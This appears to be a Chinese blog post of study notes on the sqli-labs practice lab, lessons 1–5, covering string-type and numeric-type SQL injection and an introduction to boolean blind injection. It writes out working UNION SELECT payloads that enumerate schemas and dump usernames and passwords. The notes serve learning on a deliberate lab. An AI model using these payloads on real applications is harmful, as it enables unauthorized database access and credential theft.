

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.jpg">
  <link rel="icon" href="/img/logo.jpg">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="aidemofashi">
  <meta name="keywords" content="">
  
    <meta name="description" content="sql-labs 学习笔记sql-labs less-1字符型sql注入后端代码(编的) 1select * from users where id&#x3D;&#x27;$get_id&#x27; 在url中直接使用’#’会被url解析，导致传入服务器的不为’#’所以使用‘- - +’ 12?id&#x3D;1&#x27;&#x2F;&#x2F;看能否判断sql注入类型 拼入sql查询 1select * from users whe">
<meta property="og:type" content="article">
<meta property="og:title" content="note-01">
<meta property="og:url" content="https://aidemofashi.github.io/2025/02/26/notepad/index.html">
<meta property="og:site_name" content="aidemofashi&#39;s blog">
<meta property="og:description" content="sql-labs 学习笔记sql-labs less-1字符型sql注入后端代码(编的) 1select * from users where id&#x3D;&#x27;$get_id&#x27; 在url中直接使用’#’会被url解析，导致传入服务器的不为’#’所以使用‘- - +’ 12?id&#x3D;1&#x27;&#x2F;&#x2F;看能否判断sql注入类型 拼入sql查询 1select * from users whe">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/2.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/3.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/4.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/5.png">
<meta property="og:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/6.png">
<meta property="article:published_time" content="2025-02-26T13:47:26.000Z">
<meta property="article:modified_time" content="2025-10-18T15:39:01.540Z">
<meta property="article:author" content="aidemofashi">
<meta property="article:tag" content="sql-labs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://39.105.15.250/aidemofashi_home/img/note-10/1.png">
  
  
  
  <title>note-01 - aidemofashi&#39;s blog</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"aidemofashi.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>aidemofashi&#39;s blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="http://39.105.15.250/aidemofashi_home/index.html" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/main.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="note-01"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-26 21:47" pubdate>
          2025年2月26日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          66k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          553 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">note-01</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="sql-labs-学习笔记"><a href="#sql-labs-学习笔记" class="headerlink" title="sql-labs 学习笔记"></a>sql-labs 学习笔记</h1><h2 id="sql-labs-less-1"><a href="#sql-labs-less-1" class="headerlink" title="sql-labs less-1"></a>sql-labs less-1</h2><p>字符型<br>sql注入后端代码(编的)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure>
<p><em><strong>在url中直接使用’#’会被url解析，导致传入服务器的不为’#’所以使用‘- - +’</strong></em></p>
<figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fsharp"><span class="hljs-operator">?</span><span class="hljs-built_in">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>&#x27;<br><span class="hljs-comment">//看能否判断sql注入类型</span><br></code></pre></td></tr></table></figure>
<p>拼入sql查询</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>回显：<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
<p>KIMI：  </p>
<blockquote>
<p>这个错误信息表明你的SQL语句中存在语法问题，具体问题出现在’1’附近，可能是因为SQL语句的拼接方式不正确，或者某些部分的格式不符合MySQL的语法规则。<br>从错误信息来看，问题可能出在以下几个方面：</p>
</blockquote>
<blockquote>
<p>单引号的使用：错误信息中提到’1’，这表明SQL语句中可能有多余的单引号，或者单引号的使用方式不正确。</p>
</blockquote>
<blockquote>
<p>LIMIT子句的格式：LIMIT 0,1是正确的语法，但错误信息表明它可能与前面的语句拼接不当。</p>
</blockquote>
<blockquote>
<p>注入攻击：如果’1’是用户输入的一部分，那么这可能是SQL注入攻击的迹象。</p>
</blockquote>
<p><strong>LIMIT 0,1 是 SQL 语句中用于限制查询结果数量的子句，特别是在 MySQL 数据库中。<br>它的作用是从查询结果中提取指定范围的记录。具体来说，LIMIT 0,1 的含义如下：</strong>  </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs applescript">语法格式：<br>LIMIT <span class="hljs-built_in">offset</span>, <span class="hljs-built_in">count</span><br><span class="hljs-built_in">offset</span>：表示从结果集的第几条记录开始提取（从 <span class="hljs-number">0</span> 开始计数）。<br><span class="hljs-built_in">count</span>：表示提取的记录数量。<br></code></pre></td></tr></table></figure>
<p>回显有数字判断为字符型</p>
<p><em><strong>记得用‘-1’来使得前面对‘-1’的查询出现null的结果免得使用‘1’查询出的结果会将后面的查询覆盖，由刚才的：</strong></em>  </p>
<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs hsp"><span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><span class="hljs-number">0</span>：表示从结果集的第一条记录开始（即跳过 <span class="hljs-number">0</span> 条记录）。<br><span class="hljs-number">1</span>：表示只提取一条记录。<br>因此，<span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span> 的作用是从查询结果中提取第一条记录。<br></code></pre></td></tr></table></figure>
<p>测试回显行列</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;order</span> by <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><br>?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>查询当前库</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">?id=-<span class="hljs-number">1</span><span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database() <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
<p>后面的paylaod</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables where <span class="hljs-attribute">table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns where <span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>--+<br>?<span class="hljs-attribute">id</span>=-1&#x27;union select 1,2,group_concat(id,username,password) <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>--+<br></code></pre></td></tr></table></figure>

<p>在博客园和csdn有很多详细解释，只记下自己不明白去查询的点以防以后忘记</p>
<h3 id="我的新知识点"><a href="#我的新知识点" class="headerlink" title="我的新知识点"></a>我的新知识点</h3><p><strong>group_concat &#x2F;&#x2F;将查询到的表的数据结果拼接起来</strong></p>
<p><strong>union select &#x2F;&#x2F;联合查询，能将同时查询 1,2,3 个</strong></p>
<p><strong>information_schema &#x2F;&#x2F;在SQL中，INFORMATION_SCHEMA 是一个特殊的数据库，它存储了数据库管理系统（DBMS）的元数据信息。这些元数据包括数据库的结构、表的信息、列的定义、用户权限、存储过程等。</strong></p>
<p>INFORMATION_SCHEMA 提供了一种标准化的方式来访问数据库的元数据信息。它类似于一个“数据库的数据库”，帮助用户了解数据库的内部结构和配置。通过查询 INFORMATION_SCHEMA 中的表，用户可以获取以下信息：  </p>
<p>数据库中有哪些表（INFORMATION_SCHEMA.TABLES）。  </p>
<p>每个表有哪些列（INFORMATION_SCHEMA.COLUMNS）。</p>
<p>数据库的用户权限（INFORMATION_SCHEMA.USER_PRIVILEGES）。</p>
<p>数据库的字符集和校对规则（INFORMATION_SCHEMA.CHARACTER_SETS）。</p>
<p>存储过程和函数的定义（INFORMATION_SCHEMA.ROUTINES）。</p>
<p>数据库的表分区信息（INFORMATION_SCHEMA.PARTITIONS）。</p>
<p>数据库的外键约束信息（INFORMATION_SCHEMA.KEY_COLUMN_USAGE）。</p>
<p><em><strong>我看我目前用到的是下面：</strong></em></p>
<p>  (1) INFORMATION_SCHEMA.TABLES<br>用途：列出数据库中所有表的信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>table_type：表的类型（如 BASE TABLE 或 VIEW）。<br>engine：表的存储引擎（如 InnoDB 或 MyISAM）。</p>
<p>(2) INFORMATION_SCHEMA.COLUMNS<br>用途：列出表中所有列的详细信息。<br>字段：<br>table_schema：表所属的数据库名称。<br>table_name：表的名称。<br>column_name：列的名称。<br>data_type：列的数据类型<br>character_maximum_length：列的最大长度。</p>
<p><em><strong>搭配 where 来使用</strong></em></p>
<p>回顾刚才的payload</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">?id=-1&#x27;</span><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>

<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><h3 id="新知识点"><a href="#新知识点" class="headerlink" title="新知识点"></a>新知识点</h3><p><em><strong>数字型注入的sql语句</strong></em></p>
<p>后端代码 例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-string">&quot;selcet * from users where id=<span class="hljs-variable">$get_id</span>&quot;</span><br><br></code></pre></td></tr></table></figure>
<p>与字符型的区别是将用户输入内容：</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$get</span>_id</span><br></code></pre></td></tr></table></figure>
<p>直接拼接到sql语句中。  </p>
<p>对比字符型sql语句</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span> <span class="hljs-built_in">where</span> <span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;$get_id&#x27;</span><br></code></pre></td></tr></table></figure>
<p>所以不需要使用 “ ‘ “ 来构建新的查询，也不需要 ‘#’ 或者 ‘–+’来将后面的语句注释掉，如果带密码则需要注释吧  </p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>(),version()<br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span><br>?id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username ,id , <span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users<br><br><br><span class="hljs-comment">---</span><br>title: note<span class="hljs-number">-02</span><br><span class="hljs-type">date</span>: <span class="hljs-number">2025</span><span class="hljs-number">-02</span><span class="hljs-number">-27</span> <span class="hljs-number">18</span>:<span class="hljs-number">26</span>:<span class="hljs-number">18</span><br>tags: <span class="hljs-keyword">sql</span>-labs<br><span class="hljs-comment">---</span><br># <span class="hljs-keyword">sql</span>-labs less<span class="hljs-number">-3</span>  <br><br>传入：<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">回显<br>&gt;You have an error in your SQ<span class="hljs-class">L syntax;</span><span class="hljs-built_in"> check </span>the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;-1&#x27;&#x27;) LIMIT 0,1&#x27; at line 1<br><br>根据csdn和题目的提示，推测sql查询语句  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(‘$id’)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">所以当传入payload为<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1’) –+</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">整段<span class="hljs-keyword">sql</span>查询语句为：<br></code></pre></td></tr></table></figure>
<p>select * from users where $id&#x3D;(‘1’)–+)</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs markdown">如此一来成功闭合sql查询，后面就按流程走ok了<br><br><span class="hljs-section">## 新知识点</span><br><span class="hljs-strong">**<span class="hljs-emphasis">*并和括号*</span>**</span>  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(‘$id’)</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># sql-labs less-4</span><br><br>一开始也不知道有用双引号来构造的，然后还是看了csdn😅<br><br>传入：<br></code></pre></td></tr></table></figure>
<p>?id&#x3D;1”)</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">回显：<br><br>&gt; You have <span class="hljs-keyword">an</span> error <span class="hljs-keyword">in</span> your SQL syntax; check <span class="hljs-keyword">the</span> manual that corresponds <span class="hljs-built_in">to</span> your MySQL server <span class="hljs-built_in">version</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> syntax <span class="hljs-built_in">to</span> use near <span class="hljs-string">&#x27;&quot;) LIMIT 0,1&#x27;</span> <span class="hljs-keyword">at</span> <span class="hljs-built_in">line</span> <span class="hljs-number">1</span> <br><br>  <br>推测后台sql语句：<br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;(“$id”)</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">  <br>后面的paylaod：<br><br></code></pre></td></tr></table></figure>
<p>?id&#x3D;-1”) union select 1,2,3 –+<br>?id&#x3D;-1”) union select 1,database(),3 –+<br>?id&#x3D;-1”) union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema&#x3D;’security’–+<br>?id&#x3D;-1”) union select 1,database(),group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+<br>?id&#x3D;-1”) union select 1,database(),group_concat(id,username,password) from users–+</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-comment"># 新知识点</span></span><br>***双引号***  <br><br>用双引号来 &quot; 来闭合语句<br><br><br><br><br>---<br>title: note-03<br>date: 2025-02-28 20:48:34<br>tags: sql-labs<br>---<br>&lt;style&gt;<br>pre &#123;<br>  overflow-y: auto;<br>  max-height: 300px;<br>&#125;<br>&lt;/style&gt;<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">sql-labs less5</span><br>输入payload  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1</span>  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=2</span><br><br>回显<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">You are <span class="hljs-keyword">in</span>...........</span>  <br>  <br>视乎是没有回显。根据以前一点点ctf的经验，应该是布尔盲注了，没想到第五题就遇上了。  <br><br>尝试构建sql注入的paylaod  <br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;</span></span>  <br><br>回显<br><span class="hljs-meta prompt_">&gt;</span><span class="language-bash"><span class="hljs-string">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&#x27; LIMIT 0,1&#x27;</span> at line 1</span>    <br><br>推测后端语句可能为  <br></code></pre></td></tr></table></figure>
<p>select * from users where id&#x3D;’$get_id’</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br>然后看csdn<br><br>看到两种解法，经典的是基于时间的布尔盲注，新的是基于<span class="hljs-type">xml</span>报错回显的注入<br><br>##  布尔盲注<br>原理是用<span class="hljs-keyword">sql</span>中的  <br><br>&gt;<span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>  <br><br>返回的布尔值（<span class="hljs-keyword">true</span>,<span class="hljs-keyword">false</span>）然后用<span class="hljs-keyword">if</span>()设置不同的反应，根据反应来判断布尔的值来判断注入查询的数据是否存在吧<br></code></pre></td></tr></table></figure>
<p>length函数用法<br>后端语句：<br>select length()； – 返回length里的字节或字符长度</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">length</span>函数：<br><br>KIMI：  <br></code></pre></td></tr></table></figure>
<p>MySQL：LENGTH 返回字节长度，CHAR_LENGTH 返回字符长度。<br>PostgreSQL：LENGTH 返回字符长度。<br>SQLite：LENGTH 返回字节长度。<br>SQL Server：LEN 返回字符长度。<br>Oracle：LENGTH 返回字节长度，LENGTHC 返回字符长度。</p>
<p>PostgreSQL&#x2F;SQLite&#x2F;Oracle：使用 CASE 语句。</p>
<p>SQL Server：使用 CASE 语句或 IF…ELSE 语句。</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><br>sql中<span class="hljs-built_in">if</span>()语句的用法：  <br><br>KIMI：  <br><br></code></pre></td></tr></table></figure>
<p>MySQL：IF(expr, true_expr, false_expr)<br>SELECT IF(1 &gt; 0, ‘True’, ‘False’); – 返回 ‘True’<br>SELECT IF(1 &lt; 0, ‘True’, ‘False’); – 返回 ‘False’</p>
<p>PostgreSQL&#x2F;SQLite&#x2F;Oracle：使用 CASE 语句。</p>
<p>SQL Server：使用 CASE 语句或 IF…ELSE 语句。  </p>
